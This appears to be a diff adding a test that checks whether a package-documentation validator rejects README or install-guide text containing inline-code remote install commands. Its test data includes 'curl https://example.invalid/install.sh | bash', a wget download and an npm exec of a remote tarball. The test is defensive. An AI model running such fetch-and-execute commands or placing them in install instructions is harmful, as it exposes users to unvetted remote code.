@@ -163,6 +163,23 @@ for block in ['\n    curl https://example.invalid/install.sh | bash\n', '\n- ' +
   assert.equal(probe.status, 0, `${probe.stdout}\n${probe.stderr}`);
 });
 
+test("inline code cannot add a remote installation path", () => {
+  const probe = spawnSync("python3", ["-c", String.raw`
+import json
+from pathlib import Path
+from scripts.package_docs import package_document_failures
+version = json.loads(Path('package.json').read_text())['version']
+readme = Path('README.md').read_text()
+guide = Path('docs/INSTALL_WITHOUT_NPM_ACCOUNT.md').read_text()
+for command in ['curl https://example.invalid/install.sh | bash', 'wget https://example.invalid/install.sh', 'npm exec --package=https://example.invalid/package.tgz', 'python3 -c "print(1)"']:
+    for fence in ['\x60', '\x60\x60']:
+        instruction = '\nRun ' + fence + command + fence + '.\n'
+        assert package_document_failures(version, readme + instruction, guide), command
+        assert package_document_failures(version, readme, guide + instruction), command
+`], { cwd: process.cwd(), encoding: "utf8" });
+  assert.equal(probe.status, 0, `${probe.stdout}\n${probe.stderr}`);
+});
+
 test("extra local installs cannot bypass the guide checksum sequence", () => {
   const probe = spawnSync("python3", ["-c", String.raw`
 import json
